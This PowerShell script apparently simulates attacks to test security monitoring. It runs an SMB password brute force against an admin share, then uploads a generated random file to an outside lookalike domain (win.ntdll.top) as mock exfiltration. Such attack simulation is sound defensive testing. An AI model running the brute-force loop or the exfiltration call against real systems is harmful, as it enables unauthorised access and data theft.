 $target = '10.254.100.99' #this is the smb target, use IP or hostname
$pass = 'passwords.txt' #create list of passwords to brute force with, change this variable to the location of that text file.
$user = 'Admin' #local username of the machine that is the smb target, in this case it is just admin even though that account does not exist on the target machine.
$fileSize = 1048576 # size in bytes, this is 1MB
$filename = 'testfile.zip' # name of the test file that is generated and transfered
$uri = 'http://win.ntdll.top:8080'# url to attempt http exfil
$uploadPath = '/files'# route to try upload to 
$counter = 0 # do not touch 
$passcount = (Get-Content $pass).Length # donot touch

Write-Host "Senario 1: SMB Brute Force"

foreach($ps in Get-Content $pass) {

    Write-Progress -Activity 'Testing SMB Brute Force' -CurrentOperation $ps -PercentComplete ((($counter++) / $passcount) * 100)
    $u = $user -replace "^\.\\", "$host\"
    $c = New-Object System.Management.Automation.PSCredential $u, ($ps | ConvertTo-SecureString -AsPlainText -Force)
    try {

        if (New-PSDrive -Name Share -PSProvider FileSystem -Root \\$target\Admin$ -Credential $c -EA SilentlyContinue) {

            Remove-PSDrive Share

    

        } 

    

    } catch {

        Write-Host "Error"

    }

} 

Write-Host "Senario 2: File Exfiltration"


 

$out = new-object byte[] $fileSize; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes($filename, $out)

Invoke-RestMethod -Uri $uri -Method Post -InFile $filename -EA SilentlyContinue

Remove-Item $filename